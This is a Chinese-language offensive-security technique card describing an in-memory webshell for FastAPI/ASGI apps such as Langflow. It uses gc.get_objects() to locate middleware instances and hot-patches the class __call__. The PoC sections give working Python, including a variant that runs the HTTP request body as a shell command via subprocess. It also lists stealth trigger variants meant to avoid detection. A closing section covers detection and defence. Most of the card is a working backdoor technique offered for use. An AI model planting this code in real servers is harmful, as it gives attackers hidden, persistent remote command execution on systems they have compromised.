---
id: web-python-framework-fastapi-gc-asgi-middleware-memshell
title: FastAPI/ASGI 中间件 __call__ 热补丁内存马：gc.get_objects() 定位实例，工厂模式应用也能注入
type: scenario
domain: web
path: web/python/framework
technique: fastapi-gc-asgi-middleware-memshell
aliases:
- FastAPI 中间件内存马
- ASGI 中间件 __call__ 热补丁
- gc.get_objects 找 FastAPI
- 工厂模式内存马
- ContentSizeLimitMiddleware 注入
- 进程内 ASGI 后门
tags:
- web
- python
- fastapi
- asgi
- starlette
- memshell
- persistence
- gc
- monkeypatch
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V174
  verified_at: '2026-11-06T17:00:30+08:00'
  notes: 已对照原文核对：gc.get_objects() 定位 ContentSizeLimitMiddleware、__call__ 热补丁返回 patched_success 与截图 19-21 一致；原文 MethodType(patched_call, ContentSizeLimitMiddleware) 将类绑定为 self，回落分支 self.app 触发 AttributeError（截图 20），卡内修正为直接赋普通函数使 self 绑定实例，写法正确；无 sources/source_url。未实际执行 PoC。
---

## 一句话结论

当 FastAPI 应用由工厂函数创建、实例没有被任何模块全局变量引用时，`sys.modules` 扫描找不到 app；但 `gc.get_objects()` 能枚举到存活的 ASGI 中间件实例，直接给其类打 `__call__` 热补丁即可在请求链最外层截获指定路径并返回攻击者响应，实现不依赖 app 引用的内存马。

## 原理

- ASGI 服务器对每个请求调用最外层可调用对象：`await app(scope, receive, send)`。Langflow 用 `ContentSizeLimitMiddleware` 包住 FastAPI 应用，所有 HTTP 请求都会先进入该中间件的 `__call__`。
- 工厂模式下 `uvicorn.run(create_app(), ...)` 或 `uvicorn.run("module:create_app", factory=True)` 得到的 app 实例只被 uvicorn 内部变量/调用栈引用，没有赋给模块全局变量；`sys.modules` 各模块的 `vars()` 里自然找不到它。
- `gc.get_objects()` 返回 GC 追踪的所有存活对象，包括中间件实例等容器对象。按目标类做 `isinstance` 过滤即可拿到实例，无需知道它被谁引用。
- Python 的 `instance(...)` 调用走**类型**上的特殊方法查找：`type(instance).__call__(instance, ...)`，实例字典里的 `__call__` 不参与。因此要让调用链生效，必须改 `type(instance).__call__`（或该类的 `__call__`），不能只给实例属性赋值。
- 补丁后的 `__call__` 在入口检查 `scope["type"]/["path"]/["method"]`，命中触发路径时构造 `JSONResponse` 并直接 `await response(scope, receive, send)` 完成 ASGI 响应；未命中则调用原 `__call__` 走正常业务。改动只存在于进程内存，重启即失效。
- 由于补丁位于请求处理链最外层，它不依赖 FastAPI 路由表，也不要求 app 实例可被枚举；这正好覆盖“工厂创建、无模块引用”的场景。

## 触发条件

- 已在目标 Python 进程内获得任意代码执行（如 Langflow CVE-2025-3248 的 `validate_code` 执行、其他 eval/exec 入口）。
- 目标 ASGI 应用外侧存在可导入的中间件类，且进程内至少有一个存活实例；该类与实例能被 `gc.get_objects()` 枚举到。
- 攻击者能向该进程发起 HTTP 请求以触发补丁路径。
- 单进程注入；多 worker 时每个 worker 需分别执行。

## 利用步骤

1. 先确认 `sys.modules` 扫描失败（工厂模式）：遍历模块全局变量找不到 `FastAPI` 实例。
2. 导入目标中间件类，用 `gc.get_objects()` + `isinstance` 找存活实例，确认数量与 `__call__` 绑定情况。
3. 保存原始 `__call__`，定义补丁函数：触发路径返回标记响应，其余请求委托原始实现。
4. 把补丁函数赋给该类的 `__call__`（普通函数即可，实例调用时会自动绑定 self）。
5. 访问触发路径确认返回标记；随后可把触发逻辑替换为命令执行。

## PoC

定位实例（Langflow 1.1.4 的中间件）：

```python
import gc
from langflow.middleware import ContentSizeLimitMiddleware

instances = [obj for obj in gc.get_objects()
             if isinstance(obj, ContentSizeLimitMiddleware)]
for obj in instances:
    print(obj, id(obj), obj.__call__)
```

注入固定响应路由（修正版，直接赋普通函数让 self 绑定实例）：

```python
from fastapi.responses import JSONResponse
from langflow.middleware import ContentSizeLimitMiddleware

original_call = ContentSizeLimitMiddleware.__call__

async def patched_call(self, scope, receive, send):
    if (scope.get("type") == "http"
            and scope.get("path") == "/api/v1/inject/test"
            and scope.get("method") == "GET"):
        response = JSONResponse({"status": "patched_success"})
        await response(scope, receive, send)
        return
    await original_call(self, scope, receive, send)

ContentSizeLimitMiddleware.__call__ = patched_call
```

访问 `GET /api/v1/inject/test` 返回 `{"status":"patched_success"}`。

命令执行变体（把请求体当命令，读取完整 body 后执行并回显）：

```python
from starlette.responses import Response
import subprocess

async def patched_call(self, scope, receive, send):
    if scope.get("type") == "http" and scope.get("path") == "/api/v1/inject/test":
        body = b""
        while True:
            msg = await receive()
            body += msg.get("body", b"")
            if not msg.get("more_body", False):
                break
        out = subprocess.run(body.decode(), shell=True, capture_output=True, text=True)
        await Response(out.stdout + out.stderr, media_type="text/plain")(scope, receive, send)
        return
    await original_call(self, scope, receive, send)
```

注意：原始写法用 `MethodType(patched_call, ContentSizeLimitMiddleware)` 把**类本身**绑定为 self，触发分支能正常返回，但非触发请求回落到原始 `__call__` 时 self 是类对象，访问 `self.app` 会抛 `AttributeError: type object 'ContentSizeLimitMiddleware' has no attribute 'app'`；调试控制台可见该错误。直接赋普通函数（或 `type(instance).__call__ = patched_call`）才能让 self 是真实实例，生产注入必须修正并对异常做兜底，否则会打断全部正常请求。

## 变体与关联

- 触发方式变体：按 Header、Cookie、特定 UA 或请求体魔数命中，避免固定路径被扫描发现；也可只在带某个参数的请求上执行，其余流量完全透明。
- 目标对象变体：不一定要用 Langflow 的 `ContentSizeLimitMiddleware`；任何包住 app 的自定义 ASGI 中间件类都可作为补丁点。也可先用 `gc.get_objects()` + `isinstance(obj, FastAPI)` 尝试直接找回工厂创建的 app，再回到路由注册思路，但实例是否被 GC 追踪、能否稳定枚举需按目标版本验证。
- 对比：`sys.modules` 路由注册型内存马见 [[web-python-framework-fastapi-sys-modules-route-memshell]]；Flask 侧等价技术见 [[web-python-framework-flask-hook-registry-memshell]] 与 [[web-python-framework-flask-route-registration-memshell]]。
- 边界：补丁作用于整个类，会影响该类的所有实例；多 worker 进程需逐个注入；应用重启后失效。

## 检测与防御

- 检测：对关键中间件类的 `__call__` 做启动基线，周期比对 `__code__.co_filename`/`co_firstlineno`；被 `exec` 定义的补丁函数文件名通常是 `<string>`，与源码文件不符。若是 `MethodType` 包装，检查 `__func__.__code__.co_filename`。
- 检测：枚举 `gc.get_objects()` 中出现异常数量的 ASGI 中间件实例、或类方法被替换的告警；结合进程内 Python 审计钩子（`sys.addaudithook`）记录 `exec`/`eval` 与模块属性写入。
- 防御：消除任意代码执行入口是根本；限制生产容器内的交互式调试；发现注入后重启进程并轮换密钥，仅删除单个路径/恢复单个类可能遗漏其他补丁点。
